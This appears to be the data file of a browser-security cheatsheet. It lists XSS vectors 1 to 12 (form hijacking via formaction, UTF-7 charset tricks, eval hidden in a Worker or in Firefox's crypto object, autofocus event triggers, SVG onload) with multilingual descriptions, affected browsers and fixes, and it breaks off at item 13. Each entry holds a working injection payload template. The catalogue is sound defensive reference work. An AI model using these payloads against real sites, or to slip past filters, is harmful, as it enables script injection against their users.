/* Items - the set of available items and vectors */
var items = 
[
    { /* ID 1 - XSS via formaction - requiring user interaction (1) */
        'id'         : 1, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'XSS via formaction - requiring user interaction (1)',
            'ja' : 'formaction\u7d4c\u7531\u3067\u306eXSS - \u30e6\u30fc\u30b6\u306e\u4ecb\u5728\u304c\u5fc5\u8981',
            'ru' : 'Пассивный скриптинг через formaction (1)',
            'cs' : 'XSS pomocí formaction - vyžaduje uživatelskou interakci (1)',
            'de' : '',
            'tr' : 'formaction ile XSS - kullanıcı etkileşimi gerektiren (1)',
            'zh' : '通过formaction属性进行XSS - 需要用户进行交互 (1)'
        },
        'data'       : '<form id="test"></form><button form="test" formaction="%js_uri_alert%">X</button>',
        'trigger'    : 'document.getElementsByTagName("button")[0].click()',
        'description': {
            'en' : 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
            'ja' : 'HTML5\u306eform\u3068formaction\u6a5f\u80fd\u3092\u4f7f\u3063\u3066\u65e2\u5b58\u306eform\u3092\u5916\u5074\u304b\u3089\u4e57\u3063\u53d6\u308b\u624b\u6cd5',
            'ru' : 'Вектор демонстрирует возможности HTML 5 атрибутов form и formaction по захвату внешней формы.',
            'cs' : 'Ukázka možností zneužití form a formaction k převzetí kontroly z místa mimo formulář',
            'de' : '',
            'tr' : 'Bu vektör HTML5 form ve formaction yetenekleri ile asıl form dışındaki formu hijack edebilmeyi gösterir.',
            'zh' : '这个向量展示了通过HTML5的form和formaction从外部劫持表单的一种方法.'
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction'],
        'howtofix'   : {
            'en' : 'Don\'t allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes. Avoid "id" attributes for forms as well as submit buttons.',
	    'ja' : '\u0022form\u0022\u3068\u0022formaction\u0022\u5c5e\u6027\u3092\u542b\u3080\u8981\u7d20\u3092\u30e6\u30fc\u30b6\u306b\u5165\u529b\u3055\u305b\u306a\u3044\u3001\u3042\u308b\u3044\u306f\u305d\u308c\u3089\u306e\u5c5e\u6027\u3092\u7121\u52b9\u306a\u5024\u306b\u5909\u63db\u3059\u308b\u3053\u3068\u3002\u0022id\u0022\u5c5e\u6027\u306fform\u3060\u3051\u3067\u306a\u304fsubmit\u30dc\u30bf\u30f3\u306b\u3064\u3044\u3066\u3082\u5bfe\u5fdc\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Не разрешайте пользовательскую разметку, содержащую атрибуты form и formaction или неправильные значения этих атрибутов. Избегайте атрибут id в формах, как и элементы ввода submit типа.',
            'cs' : 'Nedovolte uživatelům vložit kód obsahující atributy "form" a "formaction" či jejich "zkomolené" tvary. Vyhněte se atributu "id" u formulářů i u odesílacích tlačítek.',
            'de' : '',
            'tr' : 'Kullanıcıların "form" ve "formaction" markup\'larını yollamaları engellenmeli veya bu özellikler kullanışsız hale getirilmelidir. Submit butonlarında olduğu gibi formlarda "id" özelliklerinden kaçının.',
            'zh' : '不要让用户提交包含 "form" 和 "formaction"属性的标签.避免在form中出现id属性及提交按钮.'
        },
        'browsers'   : {
            'firefox' : ['4.0', '15.0'],
            'opera': ['10.5', '11.0', '12.0', 'mobile'], 
            'chrome': ['10.0', '23.0'],
            'safari' : ['4.0.4', '5.1.7']
        },
        'tags'       : ['xss', 'html5', 'opera', 'chrome', 'firefox', 'formaction', 'javascript', 'button'],
        'reporter'   : '.mario'
    },
    { /* ID 2 - XSS via x-imap4-modified-utf7 (1) */
        'id'         : 2, 
        'category'   : 'charset', 
        'name'       : {
            'en' : 'XSS via x-imap4-modified-utf7 (1)',
            'ja' : 'x-imap4-modified-utf7\u3092\u5229\u7528\u3057\u305fXSS (1)',
            'ru' : 'XSS с использованием x-imap4-modified-utf7 (1)',
            'cs' : 'XSS via x-imap4-modified-utf7 (1)',
            'de' : '',
            'tr' : 'x-imap4-modified-utf7 ile XSS (1)',
            'zh' : '通过x-imap4-modified-utf7编码进行XSS (1)'
        },
        'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
        'description': {
            'en' : 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
            'ja' : '\u3053\u306e\u653b\u6483\u624b\u6cd5\u306f\u3001\u691c\u51fa\u304c\u975e\u5e38\u306b\u56f0\u96e3\u306a\u3001\u98a8\u5909\u308f\u308a\u306acharset\u306b\u3088\u308bXSS\u306e\u624b\u6bb5\u3068\u306a\u308a\u5f97\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002',
            'ru' : 'Этот вектор показывает, как ответвление кодировки UTF7 может быть использовано для создания очень труднообнаружимых XSS векторов.',
            'cs' : 'Tento kód ukazuje, jak použít UTF7 k vytvoření velmi obtížně dešifrovatelného XSS útoku',
            'de' : '',
            'tr' : 'Bu vektör UTF-7 türevlerinin tespiti zor egzotik karakter kodlamalarıyla türetilmiş XSS vektörleri için nasıl kullanılabileceğini göstermektedir.',
            'zh' : '这个向量说明UTF-7编码能产生很多你意想不到的XSS向量.'
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure no <META> tags can be injected and the website is delivered with a charset.',
            'ja' : '\u653b\u6483\u8005\u306b\u3088\u308b\u003cmeta\u003e\u8981\u7d20\u306e\u633f\u5165\u304c\u4e0d\u53ef\u80fd\u306a\u3053\u3068\u3001web\u30b5\u30a4\u30c8\u304ccharset\u3092\u6b63\u3057\u304f\u9001\u51fa\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Убедитесь, что тег <META> не может быть внедрен и страницы сайта отправляются с указанием кодировки.',
            'cs' : 'Ujistěte se, že do stránky nemůže být vložen žádný <META> tag a že webová stránka má definovanou znakovou sadu.',
            'de' : '',
            'tr' : 'Websitesinin karakter kodlaması ile sunulduğundan ve herhangi bir <META> etiketinin enjekte edilmediğinden emin olun.',
            'zh' : '确保没有被注入<META>标签,及网站已申明了上下文的编码方式.'
        },
        'browsers'   : {
            'firefox': [
                '2.x', '3.5', '3.6', '3.6.28', 'end'
            ]
        },
        'tags'       : ['xss', 'utf7', 'firefox', 'charset'],
        'reporter'   : '.mario'
    },
    { /* ID 3 - XSS via x-imap4-modified-utf7 (2) */
        'id'         : 3, 
        'category'   : 'charset', 
        'name'       : {
            'en' : 'XSS via x-imap4-modified-utf7 (2)',
            'ja' : 'x-imap4-modified-utf7\u3092\u5229\u7528\u3057\u305fXSS (2)',
            'ru' : 'XSS с использованием x-imap4-modified-utf7 (2)',
            'cs' : 'XSS via x-imap4-modified-utf7 (2)',
            'de' : '',
            'tr' : 'x-imap4-modified-utf7 ile XSS (2)',
            'zh' : '通过x-imap4-modified-utf7编码进行XSS (2)'
        },
        'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
        'description': {
            'en' : 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
            'ja' : '\u3053\u306e\u653b\u6483\u624b\u6cd5\u306f\u3001\u691c\u51fa\u304c\u975e\u5e38\u306b\u56f0\u96e3\u306a\u3001\u98a8\u5909\u308f\u308a\u306acharset\u306b\u3088\u308bXSS\u306e\u624b\u6bb5\u3068\u306a\u308a\u5f97\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002',
            'ru' : 'Этот вектор показывает, как ответвление кодировки UTF7 может быть использовано для создания очень труднообнаружимых XSS векторов.',
            'cs' : 'Tento kód ukazuje, jak použít UTF7 k vytvoření velmi obtížně dešifrovatelného XSS útoku',
            'de' : 'Bu vektör UTF-7 türevlerinin tespiti zor egzotik karakter kodlamalarıyla türetilmiş XSS vektörleri için nasıl kullanılabileceğini göstermektedir.',
            'zh' : '这个向量说明UTF-7编码能产生很多你意想不到的XSS向量.'
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure no <META> tags can be injected and the website is delivered with a charset.',
            'ja' : '\u653b\u6483\u8005\u306b\u3088\u308b\u003cmeta\u003e\u8981\u7d20\u306e\u633f\u5165\u304c\u4e0d\u53ef\u80fd\u306a\u3053\u3068\u3001web\u30b5\u30a4\u30c8\u304ccharset\u3092\u6b63\u3057\u304f\u9001\u51fa\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Убедитесь, что тег <META> не может быть внедрен и страницы сайта отправляются с указанием кодировки.',
            'cs' : 'Ujistěte se, že do stránky nemůže být vložen žádný <META> tag a že webová stránka má definovanou znakovou sadu.',
            'de' : '',
            'tr' : 'Websitesinin karakter kodlaması ile sunulduğundan ve herhangi bir <META> etiketinin enjekte edilmediğinden emin olun.',
            'zh' : '确保没有被注入<META>标签,及网站已申明了上下文的编码方式.'
        },          
        'browsers'   : {
            'firefox': [
                '2.x', '3.5', '3.6', '3.6.28', 'end'
            ]
        },
        'tags'       : ['xss', 'utf7', 'firefox', 'charset'],
        'reporter'   : '.mario'
    },
    { /* ID 4 - Self-including DOM Worker XSS */
        'id'         : 4, 
        'category'   : 'dom', 
        'name'       : {
            'en' : 'Self-including DOM Worker XSS',
            'ja' : '',
            'ru' : 'Скриптинг в DOM с помощью объекта Worker.',
            'cs' : 'XSS pomocí objektu Worker',
            'de' : '',
            'tr' : 'DOM Worker objesi ile XSS',
            'zh' : '通过DOM Worker包含上下文本身进行XSS'
        },
        'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
        'description': {
            'en' : 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
            'ja' : '\u30b9\u30af\u30ea\u30d7\u30c8\u306e\u5b9f\u884c\u306b DOM workers \u3068 message \u30a4\u30d9\u30f3\u30c8\u3092\u5229\u7528\u3057\u305f\u3001\u81ea\u8eab\u3092 include \u3059\u308b\u30b3\u30fc\u30c9',
            'ru' : 'Исполнение кода происходит благодаря отсылке javascript-сообщения методом postMessage и приёму его на той же странице объектом Worker, к обработчику события onmessage которого привязана функция, запускающая метод eval.',
            'cs' : 'Samovkládací kód používá DOM worker a poslání zprávy, která spustí vykonání skriptu',
            'de' : '',
            'tr' : 'Kendini dahil eden kod parçası bir DOM worker kullanarak ve kendisine betik çalıştırmak için bir mesaj tetikleyerek XSS\'e sebebiyet verir.',
            'zh' : '这是一个self-including的例子,通过DOM worker包含上下文的方式触发事件引起脚本执行.'
        },
        'urls'    : ['https://developer.mozilla.org/En/Using_web_workers'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
            'firefox': [
                '3.5', '3.6', '15.0'
            ]
        },
        'tags'       : ['xss', 'dom', 'firefox', 'worker', 'self-inclusion', 'e4x'],
        'reporter'   : '.mario'
    },
    { /* ID 5 - Firefox crypto object - hidden eval() */
        'id'         : 5, 
        'category'   : 'dom', 
        'name'       : {
            'en' : 'Firefox crypto object - hidden eval()',
            'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8 - \u96a0\u308c\u305f eval()',
            'ru' : 'Объект crypto в Firefox - скрытый eval()',
            'cs' : 'Firefox crypto object - skrytý eval()',
            'de' : '',
            'tr' : 'Firefox kripto objesi - saklı eval()',
            'zh' : 'Firefox crypto 对象 - 隐式eval()'
        },
        'data'       : '<script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')</script>',
        'description': {
            'en' : 'This vector uncovers a hidden eval() inside the Firefox crypto object',
            'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u5185\u306b\u96a0\u3055\u308c\u305f eval\u0028\u0029 \u6a5f\u80fd\u3067\u3059\u3002',
            'ru' : 'Этот вектор срывает покровы с объекта crypto в Firefox, выявляя внутри него скрытый eval().',
            'cs' : 'Ukázka volání eval(), skrytého v objektu crypto ve Firefoxu',
            'de' : '',
            'tr' : 'Bu vektör Firefox\'un kripto objesi içindeki saklı olan eval() fonksiyonunu ortaya çıkartır.',
            'zh' : '这个向量披露了火狐中crypto对象的一个隐式eval()'
        },
        'urls'    : ['https://developer.mozilla.org/en/JavaScript_crypto'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
            'firefox': [
                '2.x', '3.x', '4.0', '15.0'
            ]
        },
        'tags'       : ['xss', 'dom', 'firefox', 'crypto', 'eval', 'csp', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 6 - Firefox setter based JavaScript execution */
        'id'         : 6, 
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'Firefox setter based JavaScript execution',
            'ja' : 'Firefox\u306esetter\u306b\u3088\u308bJavaScript\u306e\u5b9f\u884c',
            'ru' : 'Исполнение кода в Firefox с использованием setter',
            'cs' : 'Spuštění kódu pomocí setterů ve Firefoxu',
            'de' : '',
            'tr' : 'Firefox\'da setter tabanlı JavaScript çalıştırma',
            'zh' : '基于Firefox setter执行Javascript'
        },
        'data'       : '<script>({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%</script>',
        'description': {
            'en' : 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
            'ja' : 'Gecko\u002fFirefox\u306esetter\u306b\u3088\u308b\u62ec\u5f27\u3092\u4f7f\u308f\u306a\u3044JavaScript\u306e\u5b9f\u884c',
            'ru' : 'Применение setter`ов в Gecko/Firefox для выполнения JavaScript без использования круглых скобок.',
            'cs' : 'Použití setterů v Gecko/Firefoxu k vykonání JavaScriptu',
            'de' : '',
            'tr' : 'Gecko/Firefox üzerinde setter\'lar ile parantezler kullanmadan JavaScript çalıştırmak için kullanılır.',
            'zh' : '在Gecko/Firefox里可以使用setter间接调用Javascript函数,而不需要括号.'
        },
        'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
            'firefox': [
                '1.x', '2.x', '3.x', '3.5', '3.6', '3.6.28', 'end'
            ]
        },
        'tags'       : ['xss', 'dom', 'firefox', 'setter', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 7 - Self-executing focus event via autofocus */
        'id'         : 7, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Self-executing focus event via autofocus',
            'ja' : 'autofocus\u306b\u3088\u308bfocus\u30a4\u30d9\u30f3\u30c8\u3092\u5229\u7528\u3057\u305f\u81ea\u5df1\u5b9f\u884c',
            'ru' : 'Автофокусировка как способ автоматического исполнения кода',
            'cs' : 'Automatické vyvolání obsluhy fokusu pomocí autofocus',
            'de' : '',
            'tr' : 'autofocus ile kendiliğinden çalışabilir focus olayı',
            'zh' : '通过autofocus属性执行本身的focus事件'
        },
        'data'       : '<input onfocus=%js_write% autofocus>',
        'description': {
            'en' : 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
            'ja' : 'autofocus \u5c5e\u6027\u3092\u6301\u3064 input \u8981\u7d20\u3092\u4f7f\u3063\u3066\u81ea\u8eab\u306efocus\u30a4\u30d9\u30f3\u30c8\u306e\u30cf\u30f3\u30c9\u30e9\u3092\u547c\u3073\u51fa\u3059\u624b\u6cd5\u3002\u30e6\u30fc\u30b6\u306e\u4ecb\u5728\u306f\u4e0d\u8981\u3002',
            'ru' : 'Этот вектор использует тег input с атрибутом autofocus, чтобы вызвать свой собственный обработчик события фокусировки без взаимодействия с пользователем.',
            'cs' : 'Tento útok používá elementu autofocus k vyvolání obslužné rutiny pro událost focus - bez zásahu uživatele',
            'de' : '',
            'tr' : 'Bu vektör autofocus çağrısı ile bir input öğesi kullanır ve kendisinin focus olayını yakalar - kullanıcı etkileşimi gerekmemektedir.',
            'zh' : '这个向量是使焦点自动跳到输入元素上,触发焦点事件 - 无需用户交互'
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602','http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control'],
        'howtofix'   : {
            'en' : 'User submitted markup should not contain "autofocus" attributes.', 
	    'ja' : '\u30e6\u30fc\u30b6\u306e\u5165\u529b\u3057\u305fHTML\u65ad\u7247\u306b \u0022autofocus\u0022 \u5c5e\u6027\u304c\u542b\u307e\u308c\u306a\u3044\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
            'cs' : 'Uživatelsky vkládaný kód by neměl obsahovat atribut "autofocus".',
            'de' : '',
            'tr' : 'Kullanıcı tanımlı markup\'lar "autofocus" özelliğini barındırmamalıdır.',
            'zh' : '检测用户提交的内容中是否含有"autofocus"属性'
        },          
        'browsers'   : {
		    'firefox' : ['4.0', '15.0'],
            'opera': ['9.0', '10.0', '11.0', '12.0'],
            'safari' : ['4.0', '5.0', '5.1.7'],
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'internet explorer': ['10.0']
        },
        'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
        'reporter'   : 'Gareth'
    },
    { /* ID 8 - Self-executing blur event via autofocus competition */
        'id'         : 8, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Self-executing blur event via autofocus competition',
            'ja' : 'blur\u30a4\u30d9\u30f3\u30c8\u306b\u3088\u308bautofocus\u306e\u596a\u3044\u5408\u3044\u306b\u3088\u308b\u81ea\u5df1\u5b9f\u884c',
            'ru' : 'Потеря фокуса, инициированная фокусировкой на другом теге, как способ автоматического исполнения кода.',
            'cs' : 'Automatické vyvolání obsluhy události blur pomocí soupeřících autofocusů',
            'de' : '',
            'tr' : 'autofocus ile kendiliğinden çalışabilir blur olayı',
            'zh' : '通过多个autofocus竞争焦点来触发blur事件'
        },
        'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
        'description': {
            'en' : 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
            'ja' : '\u30d5\u30a9\u30fc\u30ab\u30b9\u3092\u596a\u3044\u5408\u30462\u3064\u306einput\u8981\u7d20\u304c\u3042\u308a\u3001\u4e00\u65b9\u304c\u30d5\u30a9\u30fc\u30ab\u30b9\u3092\u5931\u3063\u305f\u5834\u5408\u306bJavaScript\u304c\u5b9f\u884c\u3055\u308c\u308b\u3002',
            'ru' : 'В этом примере мы видим два тега input, конкурирующих за фокус, и один из них исполняет JavaScript при потере им фокуса.',
            'cs' : 'V tomto případě máme dva HTML elementy, které soupeří o focus - a jeden z nich vyvolá událost blur, jakmile druhý získá focus',
            'de' : '',
            'tr' : 'Burada iki adet HTML input öğemiz var - bir tanesi focus özelliğini kaybederken JavaScript çalıştırıyor',
            'zh' : '这里我们有两个HTML input元素竞争焦点,但焦点到另一个input元素时,前面那个将会触发blur事件'
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602','http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control'],
        'howtofix'   : {
            'en' : 'User submitted markup should not contain "autofocus" attributes.',
            'ja' : '\u30e6\u30fc\u30b6\u306e\u5165\u529b\u3057\u305fHTML\u65ad\u7247\u306b \u0022autofocus\u0022 \u5c5e\u6027\u304c\u542b\u307e\u308c\u306a\u3044\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
            'cs' : 'Uživatelsky vkládaný kód by neměl obsahovat atribut "autofocus".',
            'de' : '',
            'tr' : 'Kullanıcı tanımlı markup\'lar "autofocus" özelliğini barındırmamalıdır.',
            'zh' : '检测用户提交的内容中是否含有"autofocus"属性'
        },    
        'browsers'   : {
            'safari' : ['4.0', '5.0', '5.1.7'],
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0']
        },
        'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'safari'],
        'reporter'   : '.mario'
    },
    { /* ID 9 - Opera link-source JavaScript execution via CSS */
        'id'         : 9, 
        'category'   : 'css', 
        'name'       : {
            'en' : 'Opera link-source JavaScript execution via CSS',
            'ja' : 'CSS\u7d4c\u7531\u306eOpera link\u30bd\u30fc\u30b9\u306b\u3088\u308bJavaScript\u306e\u5b9f\u884c',
            'ru' : 'Исполнение JavaScript в Opera с помощью CSS-свойства link-source',
            'cs' : 'Vykonání skriptu z CSS pomocí link-source v Opeře',
            'de' : '',
            'tr' : 'Opera link-source özelliğinden yararlanarak CSS ile JavaScript çalıştırma',
            'zh' : '使用Opera的CSS属性link-source执行javascript'
        },
        'data'       : '<a style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X</a>',
        'trigger'    : 'location=document.getElementsByTagName("a")[0].style.OLink.slice(1, -1)',
        'description': {
            'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript. Note that Opera 11.0-11.01 requires an actual <a> tag to have this work - while earlier versions work with other tags too. For later versions still available a data URI.',
            'ja' : 'Opera\u306f\u4efb\u610f\u306eHTML\u8981\u7d20\u306b\u3001\u30af\u30ea\u30c3\u30af\u3057\u3066\u5b9f\u884c\u3067\u304d\u308bJavaScript\u3092\u542b\u3081\u308b\u3053\u3068\u306e\u3067\u304d\u308blink\u30bd\u30fc\u30b9\u306e\u8a2d\u5b9a\u3092\u8a31\u3057\u3066\u3044\u308b\u3002',
            'ru' : 'Opera позволяет устанавливать ссылки для любых HTML-тегов, делать их интерактивными и пригодными для внедрения JavaScript. Обратите внимание, что в Opera 11.0-11.01 необходимо, чтобы такая ссылка устанавливаливалась для тега <a>, но не для остальных тегов. Для более старших версий остается доступным протокол data, с помощью которого можно достичь аналогичного эффекта.',
            'cs' : 'Opera umožňuje nastavit link source pro některé HTML elementy. Můžou tak vyvpolat potřebnou akci po kliknutí',
            'de' : '',
            'tr' : 'Opera keyfi olarak eklenen HTML öğeleri için "link sources" atanmasına izin vermektedir - tıklanabilir yapılarak JavaScript çalıştırılabilir',
            'zh' : 'Opera允许给任何HTML元素设置link sources,它们将可以点击和执行javascript.注意:opera 11要求是<a>标签,早期版本任意'
		},
        'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html', 'https://hackvertor.co.uk/hvurl/3c'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
            'opera': [
                '8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'
            ]
        },
        'tags'       : ['xss', 'css', 'link-source', 'opera', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 10 - JavaScript execution via <VIDEO> poster attribute  */
        'id'         : 10, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'JavaScript execution via <VIDEO> poster attribute',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью атрибута poster тега <VIDEO>',
            'cs' : 'Vykonání JavaScriptu pomocí atributu poster v elementu <VIDEO>',
            'de' : '',
            'tr' : '<VIDEO> etiketinin poster özelliği ile JavaScript çalıştırma',
            'zh' : '通过<VIDEO>的poster属性执行Javascript',
        },
        'data'       : '<video poster=%js_uri_alert%//></video>',
        'description': {
            'en' : 'Opera 10.5+ allows using poster attributes in combination with javascript: URIs. This bug has been fixed in Opera 11.',
            'ja' : '',
            'ru' : 'Opera 10.5+ поддерживает атрибут poster в сочетании с псевдоскриптом.',
            'cs' : 'Opera 10.5+ umožňuje vložit do atributu poster URL se schématem javascript:',
            'de' : '',
            'tr' : 'Opera 10.5+ poster özelliğinin javascript: URI\'leri ile ortaklaşa kullanımına izin vermektedir.',
            'zh' : 'Opera 10.5+的poster属性允许使用javascript: URI.这个bug在opera11中已修复'
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure only relative URIs, http URIs and correctly MIME-typed data URIs can be used for VIDEO poster attributes',
            'ja' : '',
            'ru' : 'Убедитесь, что для атрибута poster допускаются только относительные URI, http URI и правильные MIME типы для data:URI .',
            'cs' : 'Ujistěte se, že v atributu poster jsou vloženy pouze relativní URI, URI s http:// a datová URI se správným MIME typem.',
            'de' : '',
            'tr' : 'VIDEO poster özelliğinde sabit URI\'ler, http URI\'ler ve düzgünce MIME-type edilmiş veri URI\'leri kullandığınızdan emin olun.',
            'zh' : '确保VIDEO的poster属性是相对URI、http URI和MIME-typed正确的data URI'
        },            
        'browsers'   : {
            'opera': ['10.5', '11.00', '11.01', 'end']
        },
        'tags'       : ['xss', 'poster', 'video', 'opera', 'html5'],
        'reporter'   : '.mario'
    },
    { /* ID 11 - SVG executing JavaScript via <G> tag and onload attribute  */
        'id'         : 11, 
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG executing JavaScript via <G> tag and onload attribute',
            'ja' : '',
            'ru' : 'Исполнение JavaScript в SVG с помощью элемента <G> и атрибута onload',
            'cs' : 'Vykonání JavaScriptu v SVG pomocí elementu <G> a atributu onload',
            'de' : '',
            'tr' : 'SVG <G> etiketi ve onload özelliğini kullanarak JavaScript çalıştırma',
            'zh' : '通过SVG中G标签的onload属性执行Javascript'
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><g onload="%js_uri_alert%"></g></svg>',
        'description': {
            'en' : 'SVG files can execute JavaScript via onload events on any element without user interaction',
            'ja' : '',
            'ru' : 'SVG-файлы могут исполнять JavaScript с помощью обработчиков onload в любых элементах без взаимодействия с пользователем.',
            'cs' : 'SVG soubory mohou vykonat JavaScript pomocí události onload u libovolného elementu i bez uživatelské interakce',
            'de' : '',
            'tr' : 'SVG dosyaları hiçbir kullanıcı etkileşimi gerektirmeden herhangi bir öğenin onload olayı ile JavaScript çalıştırabilir.',
            'zh' : 'SVG文件中可以通过任意元素的onload事件执行Javascript,且不需要用户交互'
        },
        'urls'    : ['https://developer.mozilla.org/en/SVG'],
        'howtofix'   : {
            'en' : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements',
            'ja' : '',
            'ru' : 'SVG-файлы не должны рассматриваться в качестве изображений - особенно, когда дело касается загрузки. SVG-файл может содержать произвольные данные HTML, а также обработчики событий в собственных элементах.',
            'cs' : 'SVG soubory nejsou důvěryhodné jako třeba obrázky - obzvlášť při uploadu. Soubor SVG může obsahovat HTML data stejně jako obsluhu událostí.',
            'de' : '',
            'tr' : 'SVG dosyaları sadece birer resim olarak işlenmemeli - özellikle yüklemeler ile geliyorsa. Bir SVG dosyası keyfi HTML verileri ve bu HTML verileride normal öğeleri içinde olay yakalayıcıları içerebilir.',
            'zh' : '在上传时不能把SVG当图片处理,因为它可以包含任意HTML,且能被浏览器解析'
        },                        
        'browsers'   : {
            'opera': ['10.0', '11.0', '12.0'],
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'firefox': ['3.0', '3.5', '3.6', '3.6.28', 'end'],
            'safari' : ['5.0', '5.1.7'],
            'internet explorer': ['9.0']      
        },
        'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 12 - Self-executing JavaScript via <BODY> onscroll autofocus */
        'id'         : 12,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Self-executing JavaScript via <BODY> onscroll autofocus',
            'ja' : '',
            'ru' : 'Самовыполнение JavaScript с помощью обрабочкика onscroll тега <BODY> и autofocus',
            'cs' : 'Automaticky vykonaný JavaScript pomocí onscroll a autofocus',
            'de' : '',
            'tr' : '<BODY> onscroll autofocus olayı ile kendiliğinden çalıştırılabilir JavaScript',
            'zh' : '通过autofocus触发<Body>的onscroll执行Javascript.'
        },
        'data'       : '<body onscroll=%js_alert%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
        'description': {
            'en' : 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
            'ja' : '',
            'ru' : 'В этом векторе исполнение JavaScript достигается путем искусственного вызова события scroll (прокрутка страницы) тега <BODY>, происходящем из-за автофокусировки на теге <INPUT> в конце страницы.',
            'cs' : 'V tomto případě je spuštěn kód pro událost onscroll, protože po načtení je přesunut focus na input, který je na stránce hodně dole',
            'de' : '',
            'tr' : 'Bu vektör <BODY> üzerindeki onscroll olayının JavaScript çalıştırmasını tetiklemektedir. <INPUT> öğesinin autofocus özelliği sayfasının aşağı kaydırılmasını sağlamaktadır.',
            'zh' : '这个向量是使用autofocus移开焦点的方式来移动滚动条,这样就触发了<BODY>的onscroll事件'
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
		    'firefox' : ['4.0', '15.0'],
            'opera': ['9.0', '10.0', '11.0', '12.0'],
            'safari' : ['4.0', '5.0', '5.1.7'],
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0']
        },
        'tags'       : ['xss', 'autofocus', 'scroll', 'chrome', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 13 - Client-side denial of service via repeat templates */
        'id'         : 13,
        'category'   : 'dos', 
        'name'       : {
            'en' : 'Client-side denial of service via repeat templates',
            'ja' : '',
